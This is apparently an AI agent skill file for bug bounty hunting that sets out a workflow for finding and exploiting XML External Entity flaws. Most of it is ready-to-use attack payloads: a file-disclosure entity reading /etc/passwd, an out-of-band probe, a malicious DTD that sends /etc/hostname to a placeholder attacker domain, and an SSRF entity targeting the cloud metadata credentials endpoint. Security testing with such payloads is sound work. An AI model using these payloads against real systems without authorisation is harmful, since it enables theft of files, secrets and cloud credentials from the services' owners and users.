---
name: bbp-xxe-hunter
description: Specialized skill for finding and exploiting XML External Entity (XXE) vulnerabilities to read local files, execute SSRF, or cause Denial of Service.
---

# XML External Entity (XXE) Hunter Skill

This skill provides methodologies for exploiting applications that parse XML input unsafely.

## Workflow

### 1. Identifying XML Parsers
- Look for endpoints accepting `Content-Type: application/xml` or `text/xml`.
- If an endpoint accepts JSON, try changing the `Content-Type` to XML and sending the equivalent XML payload. Some parsers support both but only sanitize JSON.
- **Hidden XML:** Look for file uploads that use XML under the hood (e.g., `.docx`, `.xlsx`, `.svg`). You can unzip a `.docx` file, inject an XXE payload into `word/document.xml`, re-zip it, and upload it.

### 2. Testing for Basic XXE (File Disclosure)
Inject a DOCTYPE declaration defining an external entity that reads a local file.
- **Payload:**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck>
      <productId>&xxe;</productId>
  </stockCheck>
  ```
- If the application reflects the value of `<productId>`, it will reflect the contents of `/etc/passwd`.

### 3. Blind XXE (Out-of-Band Interaction)
If the application does not reflect the entity's value in the response, you must use Blind XXE via Out-of-Band (OOB) techniques (using Interactsh).
- **Payload:**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-interactsh-domain.com/xxe-test"> ]>
  <stockCheck>
      <productId>&xxe;</productId>
  </stockCheck>
  ```
- Monitor your Interactsh client. If the server makes an HTTP or DNS request to your domain, it is vulnerable.

### 4. Blind XXE (Data Exfiltration via OOB)
To extract data when the response is blind, you need to host a malicious DTD (Document Type Definition) file on your server.
- **Host this `malicious.dtd` on your server:**
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://your-interactsh-domain.com/?data=%file;'>">
  %eval;
  %exfiltrate;
  ```
- **Send this payload to the target:**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-server.com/malicious.dtd"> %xxe;]>
  <stockCheck><productId>1</productId></stockCheck>
  ```
- The server will download your DTD, read `/etc/hostname`, and append its contents to a request back to your Interactsh domain.

### 5. XXE to SSRF
Use XXE to perform Server-Side Request Forgery by pointing the entity to an internal IP address instead of a file.
- **Payload:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`
